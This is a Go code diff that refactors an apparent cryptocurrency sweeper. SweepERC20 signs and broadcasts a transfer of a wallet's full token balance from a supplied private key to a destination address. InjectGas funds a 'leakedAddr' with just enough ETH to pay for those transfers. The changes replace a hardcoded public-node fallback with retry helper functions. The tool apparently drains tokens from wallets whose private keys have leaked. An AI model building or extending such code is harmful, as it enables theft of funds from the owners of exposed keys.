@@ -17,9 +17,6 @@ import (
 const erc20GasLimit = uint64(65000)
 
 func SweepERC20(ctx context.Context, privHex, tokenAddr, destAddr, nodeURL string) (string, error) {
-	if nodeURL == "" {
-		nodeURL = "https://cloudflare-eth.com"
-	}
 	privBytes, err := hexToPrivBytes(privHex)
 	if err != nil {
 		return "", fmt.Errorf("parse key: %w", err)
@@ -28,20 +25,19 @@ func SweepERC20(ctx context.Context, privHex, tokenAddr, destAddr, nodeURL strin
 	pubKey := privKey.PubKey()
 	from := "0x" + keccakAddress(pubKey.SerializeUncompressed()[1:])
 
-	balHex, err := erc20Call(ctx, tokenAddr, erc20BalanceCallData(from), nodeURL)
+	bal, err := tryERC20Balance(ctx, from, tokenAddr, nodeURL)
 	if err != nil {
 		return "", fmt.Errorf("balance check: %w", err)
 	}
-	bal := new(big.Int).SetBytes(hexTrim(balHex))
 	if bal.Sign() == 0 {
 		return "", fmt.Errorf("zero balance")
 	}
 
-	nonce, err := ethGetNoncePending(ctx, from, nodeURL)
+	nonce, err := tryETHNonce(ctx, from, nodeURL, "pending")
 	if err != nil {
 		return "", fmt.Errorf("get nonce: %w", err)
 	}
-	gasPrice, err := ethGasPrice(ctx, nodeURL)
+	gasPrice, err := tryETHGasPrice(ctx, nodeURL)
 	if err != nil {
 		return "", fmt.Errorf("gas price: %w", err)
 	}
@@ -53,7 +49,7 @@ func SweepERC20(ctx context.Context, privHex, tokenAddr, destAddr, nodeURL strin
 		return "", fmt.Errorf("sign tx: %w", err)
 	}
 
-	txHash, err := ethSendRaw(ctx, rawTx, nodeURL)
+	txHash, err := tryETHBroadcast(ctx, rawTx, nodeURL)
 	if err != nil {
 		return "", fmt.Errorf("broadcast: %w", err)
 	}
@@ -136,12 +132,7 @@ func InjectGas(ctx context.Context, cfg *Config, leakedAddr string, numTokens in
 	pubKey := privKey.PubKey()
 	injectorAddr := "0x" + keccakAddress(pubKey.SerializeUncompressed()[1:])
 
-	nodeURL := cfg.ETHNodeURL
-	if nodeURL == "" {
-		nodeURL = "https://cloudflare-eth.com"
-	}
-
-	gasPrice, err := ethGasPrice(ctx, nodeURL)
+	gasPrice, err := tryETHGasPrice(ctx, cfg.ETHNodeURL)
 	if err != nil {
 		return fmt.Errorf("gas price: %w", err)
 	}
@@ -152,7 +143,7 @@ func InjectGas(ctx context.Context, cfg *Config, leakedAddr string, numTokens in
 	buffer := new(big.Int).Mul(totalGas, big.NewInt(15))
 	amount := new(big.Int).Add(totalGas, new(big.Int).Div(buffer, big.NewInt(10)))
 
-	injectorBal, err := ethGetBalanceRaw(ctx, injectorAddr, nodeURL)
+	injectorBal, _, err := tryETHBalance(ctx, injectorAddr, cfg.ETHNodeURL)
 	if err != nil {
 		return fmt.Errorf("injector balance: %w", err)
 	}
@@ -165,7 +156,7 @@ func InjectGas(ctx context.Context, cfg *Config, leakedAddr string, numTokens in
 		amount = available
 	}
 
-	nonce, err := ethGetNoncePending(ctx, injectorAddr, nodeURL)
+	nonce, err := tryETHNonce(ctx, injectorAddr, cfg.ETHNodeURL, "pending")
 	if err != nil {
 		return fmt.Errorf("injector nonce: %w", err)
 	}
@@ -176,7 +167,7 @@ func InjectGas(ctx context.Context, cfg *Config, leakedAddr string, numTokens in
 		return fmt.Errorf("sign injection tx: %w", err)
 	}
 
-	txHash, err := ethSendRaw(ctx, rawTx, nodeURL)
+	txHash, err := tryETHBroadcast(ctx, rawTx, cfg.ETHNodeURL)
 	if err != nil {
 		return fmt.Errorf("broadcast injection: %w", err)
 	}
@@ -188,7 +179,7 @@ func InjectGas(ctx context.Context, cfg *Config, leakedAddr string, numTokens in
 			return ctx.Err()
 		case <-time.After(2 * time.Second):
 		}
-		receipt, err := ethGetTxReceipt(ctx, txHash, nodeURL)
+		receipt, err := ethGetTxReceipt(ctx, txHash, cfg.ETHNodeURL)
 		if err == nil && receipt != "" {
 			logger.Printf("[inject] confirmed in tx %s", txHash)
 			return nil
